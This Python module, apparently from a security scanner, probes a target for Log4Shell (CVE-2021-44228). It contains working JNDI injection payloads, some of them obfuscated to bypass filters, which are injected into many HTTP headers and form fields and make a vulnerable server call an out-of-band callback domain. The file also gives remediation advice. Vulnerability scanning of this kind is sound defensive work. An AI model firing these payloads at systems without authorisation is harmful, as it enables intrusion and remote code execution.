"""Log4Shell (CVE-2021-44228) scanner — JNDI injection across all inputs."""
from __future__ import annotations
import asyncio
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

LOG4SHELL_HEADERS = [
 "User-Agent", "X-Forwarded-For", "X-Api-Version", "X-Forwarded-Host",
 "Referer", "Origin", "Authorization", "X-Correlation-ID", "X-Request-ID",
 "Accept-Language", "CF-Connecting-IP", "True-Client-IP", "X-Real-IP",
 "X-Client-IP", "Contact", "Forwarded", "X-Originating-IP",
 "X-Remote-IP", "X-Remote-Addr", "X-ProxyUser-Ip",
]

def _build_payloads(callback_url: str) -> list[str]:
 domain = callback_url.replace("http://", "").replace("https://", "").rstrip("/")
 return [
  f"${{jndi:ldap://{domain}/a}}",
  f"${{${{lower:j}}ndi:${{lower:l}}dap://{domain}/a}}",
  f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{domain}/a}}",
  f"${{j${{::-n}}di:ldap://{domain}/a}}",
  f"${{jndi:rmi://{domain}/a}}",
  f"${{jndi:dns://{domain}/a}}",
  f"${{${{upper:j}}ndi:ldap://{domain}/a}}",
  f"${{${{env:NaN:-j}}ndi${{env:NaN:-:}}${{env:NaN:-l}}dap${{env:NaN:-:}}//{domain}/a}}",
 ]


async def run(
 target: str,
 session: Any = None,
 scope: Any = None,
 rate_limiter: Any = None,
 proxy: str | None = None,
 oast_domain: str | None = None,
 **kwargs: Any,
) -> dict[str, Any]:
 url = target if "://" in target else f"https://{target}"
 console.print(f"\n[module][+] Log4Shell Scanner[/module] -> [target]{url}[/target]")

 if not oast_domain:
  console.print(" [dim]OAST domain required for OOB detection. Use --oast[/dim]")
  return {"target": url, "findings": [], "count": 0}

 payloads = _build_payloads(f"http://{oast_domain}")
 findings: list[dict[str, Any]] = []

 async with TalismanHTTPClient(proxy=proxy, timeout=10) as client:
  for header in LOG4SHELL_HEADERS:
   for payload in payloads[:3]: # Top 3 variants per header
    try:
     await client.get(url, headers={header: payload}, timeout=8)
    except Exception:
     pass

  # Also test URL parameters and POST body
  for payload in payloads[:2]:
   try:
    await client.get(url + f"?q={payload}", timeout=8)
    await client.post(url, data={"q": payload, "username": payload}, timeout=8)
   except Exception:
    pass

 console.print(f" Log4Shell probes sent to {len(LOG4SHELL_HEADERS)} headers × {len(payloads[:3])} payloads")
 console.print(f" [dim]Monitor {oast_domain} for DNS/HTTP callbacks — confirmed via OOB[/dim]")

 if session:
  await session.add_finding(
   target=url, module="log4shell",
   vuln_type="log4shell_probe",
   severity="info", confidence="tentative",
   title="Log4Shell probes sent — monitor OAST for callbacks",
   description=(
    f"JNDI injection payloads sent to {len(LOG4SHELL_HEADERS)} HTTP headers "
    f"and URL parameters. If the server uses Log4j 2.0-2.14.1, OOB callbacks "
    f"will appear at {oast_domain}."
   ),
   remediation=(
    "1. Upgrade Log4j to 2.17.1+ immediately.\n"
    "2. Set log4j2.formatMsgNoLookups=true as temporary mitigation.\n"
    "3. Remove JndiLookup class from classpath if update is delayed."
   ),
   cwe="CWE-917",
  )

 return {"target": url, "findings": findings, "probes_sent": len(LOG4SHELL_HEADERS) * 3}
